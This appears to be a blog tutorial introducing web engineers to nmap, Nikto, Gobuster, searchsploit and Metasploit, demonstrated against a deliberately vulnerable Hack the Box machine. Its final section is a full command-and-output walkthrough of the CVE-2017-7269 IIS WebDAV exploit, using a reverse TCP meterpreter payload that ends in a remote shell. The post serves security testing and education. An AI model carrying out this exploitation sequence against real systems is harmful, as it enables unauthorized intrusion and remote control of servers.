# Hacking tools for web engineers
We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue [Let's encrypt](https://letsencrypt.org/) certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be. But, are they?

In this post I'm going to be walking you through five tools you can easily set up and run in order to test the security of your servers and web applications. Note that the examples listed below are executed against a vulnerable-on-purpose [Hack the Box](https://www.hackthebox.eu/) machine referenced by its IP address, but the URL of your site may be used instead.

**Warning:** Some of the listed examples are very intrusive. Be sure to execute them against a local instance of the application or a test environment.

## Nmap
https://github.com/nmap/nmap

I discovered this great tool around 12 years ago. I remember it was mind-blowing to me that Ubuntu came with it installed out-of-the-box given the nature of the app! At that point it was the most popular network mapping tool around, and it still holds that position today. It has many capabilities such as host discovery, port scanning, service and OS detection, vulnerability analysis, and much more!

It is very common to run an nmap scan (or several ones) when approaching a system to get information about the services running on it. Then, depending on the results of the scan, other more specific scans and searches may be executed.

Example:
```
$ nmap -A 10.10.10.14

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 00:06 EDT
Nmap scan report for 10.10.10.14 (10.10.10.14)
Host is up (0.16s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Tue, 15 Sep 2020 04:13:15 GMT
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.79 seconds
```
The `-A` flag means the scan is aggressive which includes OS detection, service versions detection, and the execution of the default set of scripts. For less intrusive attacks use `--script=safe` instead. For vulnerability detection (very useful, but more intrusive) use `--script=vuln`.

The results show a Windows machine running the Microsoft IIS 6.0 web server on port 80. The next steps will be oriented to collect information about the web server and try to exploit it in order to get access to the system.

Tip: If nmap indicates the host is down, it may be because the server is not configured to reply to ping requests. Adding `-Pn` will launch the scan and ignore the ping check.

## Nikto
https://github.com/sullo/nikto

Nikto is a fantastic web scanner that examines web servers to find software misconfigurations, default/insecure paths available, and vulnerability to attacks such as cross-site scripting and clickjacking, among many others. The solution for some of the vulnerabilities detected by Nikto is as simple as adding a new header to your http responses which may be a neat quick win for your team.

Example:

```
$ nikto -host 10.10.10.14

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2020-09-14 20:55:10 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (SEARCH LOCK PROPFIND MKCOL PROPPATCH UNLOCK COPY listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2020-09-14 21:18:51 (GMT-4) (1421 seconds)
```

With a pretty simple command execution a lot of information about the web server was retrieved. On the top, information about the web server technologies and the development tools. Then, headers information including missing headers that would allow some kinds of attacks. And finally, warnings about available HTTP methods and interesting files and directories. Note also the OSVDB references, these are known vulnerabilities that are part of a database and their ids may help find further information about them (including exploits).

## Gobuster
https://github.com/OJ/gobuster

Gobuster is a widely-used tool to bruteforce web server paths. It is useful for detecting interesting files and folders that may lead to information disclosure or, even worse, remote code execution. In the example below the `common.txt` list of paths is used, which can be found as part of the [SecLists repository](https://github.com/danielmiessler/SecLists).

Example:
```
$ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --url 10.10.10.14
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.14
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/15 00:33:16 Starting gobuster
===============================================================
/Images (Status: 301)
/_private (Status: 403)
/_vti_bin (Status: 301)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/_vti_bin/shtml.dll (Status: 200)
/_vti_cnf (Status: 403)
/_vti_log (Status: 403)
/_vti_pvt (Status: 403)
/_vti_txt (Status: 403)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/aspnet_client (Status: 403)
/images (Status: 301)
===============================================================
2020/09/15 00:34:40 Finished
===============================================================
```

The result shows which paths were found and their corresponding HTTP status codes. Note that this information complements the already quick path discovery performed by Nikto, getting some new paths this time.

So, should these paths be visible or not? First of all navigate them, see what information can be obtained from them. Then, for standard paths it will be enough to Googe (or Duckduckgo) a bit in order to determine if they should be publicly available or not, do your investigation depending on your scan results!

## Searchsploit
https://github.com/offensive-security/exploitdb

Searchsploit is a great tool for finding available exploits for applications and kernels. If a vulnerable version of an application is being executed on your server, it may be possible for a malicious actor to exploit it to gain access to your data or perform other types of attacks. On the other hand, being able to execute these verifications ourselves is a great skill to have to proactively defend our systems.

It is worth mentioning that searchsploit works pretty well with Nmap, Nikto and other scanners, as after discovering what services are running on a certain server they can be searched by version number on searchsploit to see if there are any exploits available.

Example:
```
$ searchsploit iis 6.0

------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure           | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                    | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                      | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                               | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)     | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                   | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                            | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                              | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                   | windows/remote/19033.txt
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This is the result of searching exploits for the IIS 6.0 web server that was detected before using both Nmap and Nikto. It can be appreciated that several exploits were found for this particular version of IIS, having on the left column a short description of the vulnerability, and on the right column the path of exploits and other files with relevant information.

Tip: To retrieve the exact location of the exploits or info files on your system, let's say for the first one listed which is `windows/remote/21057.txt`,  run `searchsploit -p windows/remote/21057.txt`. If `locate` is available, `locate windows/remote/21057.txt` would also work.

__Warning:__ Do not just execute exploits if you are not sure about what they do, some of them are harmful. Open the exploit file and see what it does before running it.

## Metasploit
https://github.com/rapid7/metasploit-framework

Metasploit is an exploitation framework created by Rapid7. It is widely used by security professionals and also by black-hat hackers, and it simplifies A LOT the process of collecting information, doing a vulnerability analysis, exploiting, and post-exploiting a system. When it comes to learning resources about this tool, I cannot recommend highly enough [Hak5's Metasploit Minute](https://www.youtube.com/watch?v=TCPyoWHy4eA&list=PL7-g2-mnZwSEFhqybJFEPZYhNFqqbCe9_) and [HackerSploit's Metasploit videos](https://www.youtube.com/watch?v=8lR27r8Y_ik&list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm)!

This example will be a little bit different to the other ones as we will use _msfconsole_, the Metasploit console, to gain access to the server and pop an actual shell on it. This can be done in less than two minutes by following a few simple steps:
1) Search for IIS-related Metasploit modules (similar to searchsploit)
2) Select an exploit and set its options
3) Run exploit and gain access to the system

### Search for IIS-related Metasploit modules
Let's use the `search` command to search for modules that contain the keyword _iis_:
```
msf5 > search iis

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank       Check  Description
   -   ----                                                             ---------------  ----       -----  -----------
   0   auxiliary/admin/appletv/appletv_display_video                                     normal     No     Apple TV Video Remote Control
   1   auxiliary/admin/http/iis_auth_bypass                             2010-07-02       normal     No     MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass
   2   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof                     2010-12-21       normal     No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   3   auxiliary/dos/windows/ftp/iis_list_exhaustion                    2009-09-03       normal     No     Microsoft IIS FTP Server LIST Stack Exhaustion
   4   auxiliary/dos/windows/http/ms10_065_ii6_asp_dos                  2010-09-14       normal     No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   5   auxiliary/scanner/http/dir_webdav_unicode_bypass                                  normal     No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
   6   auxiliary/scanner/http/iis_internal_ip                                            normal     No     Microsoft IIS HTTP Internal IP Disclosure
   7   auxiliary/scanner/http/iis_shortname_scanner                                      normal     Yes    Microsoft IIS shortname vulnerability scanner
   8   auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                             normal     No     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
   9   auxiliary/scanner/http/owa_iis_internal_ip                       2012-12-17       normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
   10  exploit/windows/firewall/blackice_pam_icq                        2004-03-18       great      No     ISS PAM.dll ICQ Parser Buffer Overflow
   11  exploit/windows/ftp/ms09_053_ftpd_nlst                           2009-08-31       great      No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
   12  exploit/windows/http/amlibweb_webquerydll_app                    2010-08-03       normal     Yes    Amlibweb NetOpacs webquery.dll Stack Buffer Overflow
   13  exploit/windows/http/ektron_xslt_exec_ws                         2015-02-05       excellent  Yes    Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution
   14  exploit/windows/http/umbraco_upload_aspx                         2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
   15  exploit/windows/iis/iis_webdav_scstoragepathfromurl              2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
   16  exploit/windows/iis/iis_webdav_upload_asp                        2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
   17  exploit/windows/iis/ms01_023_printer                             2001-05-01       good       Yes    MS01-023 Microsoft IIS 5.0 Printer Host Header Overflow
   18  exploit/windows/iis/ms01_026_dbldecode                           2001-05-15       excellent  Yes    MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution
   19  exploit/windows/iis/ms01_033_idq                                 2001-06-18       good       No     MS01-033 Microsoft IIS 5.0 IDQ Path Overflow
   20  exploit/windows/iis/ms02_018_htr                                 2002-04-10       good       No     MS02-018 Microsoft IIS 4.0 .HTR Path Overflow
   21  exploit/windows/iis/ms02_065_msadc                               2002-11-20       normal     Yes    MS02-065 Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow
   22  exploit/windows/iis/ms03_007_ntdll_webdav                        2003-05-30       great      Yes    MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
   23  exploit/windows/iis/msadc                                        1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   24  exploit/windows/isapi/ms00_094_pbserver                          2000-12-04       good       Yes    MS00-094 Microsoft IIS Phone Book Service Overflow
   25  exploit/windows/isapi/ms03_022_nsiislog_post                     2003-06-25       good       Yes    MS03-022 Microsoft IIS ISAPI nsiislog.dll ISAPI POST Overflow
   26  exploit/windows/isapi/ms03_051_fp30reg_chunked                   2003-11-11       good       Yes    MS03-051 Microsoft IIS ISAPI FrontPage fp30reg.dll Chunked Overflow
   27  exploit/windows/isapi/rsa_webagent_redirect                      2005-10-21       good       Yes    Microsoft IIS ISAPI RSA WebAgent Redirect Overflow
   28  exploit/windows/isapi/w3who_query                                2004-12-06       good       Yes    Microsoft IIS ISAPI w3who.dll Query String Overflow
   29  exploit/windows/scada/advantech_webaccess_dashboard_file_upload  2016-02-05       excellent  Yes    Advantech WebAccess Dashboard Viewer uploadImageCommon Arbitrary File Upload
   30  exploit/windows/ssl/ms04_011_pct                                 2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow
```

It is possible to recognize several exploits and scanners among the Metasploit modules available for IIS servers, please take a moment to read through the results. This time the _Microsoft IIS WebDav ScStoragePathFromUrl Overflow_ exploit will be used (search result number 15 on the list), which is related to the [CVE-2017-7269](https://www.cvedetails.com/cve/CVE-2017-7269/) vulnerability and it is also known as "Exploding Can". Note that, when successful, the execution of this exploit leads to remote code execution.

### Select an exploit and set its options
The `use` command will be used to select the exploit to be executed, and `show options` to get the options that have to be set in order to execute it:
```
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl

msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.8       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
```

The only mandatory option that hasn't been set is __RHOSTS__, and corresponds to the target host (victim). So let's set it to the IP address of the same machine we scanned previously:
```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14
```

### Run the exploit and gain access to the system
A really interesting feature of Metasploit modules is that some of them have a `check` function to verify if the target host is vulnerable:
```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.10.10.14:80 - The target is vulnerable.
```

As the host seems to be vulnerable to this exploit, let's proceed to run it in order to gain access to the server:
```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.14:1030) at 2020-09-20 12:49:01 -0400
```

Boom, we pwned the system! Get some info from it using `sysinfo` and then open a regular shell:
```
meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > shell

[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 2900 created.
Channel 10 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```

And that's it! We got a meterpreter session that remotely controls the victim machine, and we also were able to pop a regular shell on it. A next step would be to gain root access to this computer, but I will leave that one for the next time :)

## Summary
On this post we went through a pretty standard security assessment that any web engineer would be able to run. What we did:
1) Run an __nmap__ scan to discover services running on a server.
2) Run a __nikto__ scan to evaluate the security of the web server running on port 80 detected by nmap.
3) Run a __gobuster__ scan in order to list interesting files and folders of the web server.
4) Use __searchsploit__ to determine if there are any existing exploits for the technologies listed by nmap, nikto and gobuster.
5) Use the __metasploit framework__ to search for exploits and to gain access to the system.
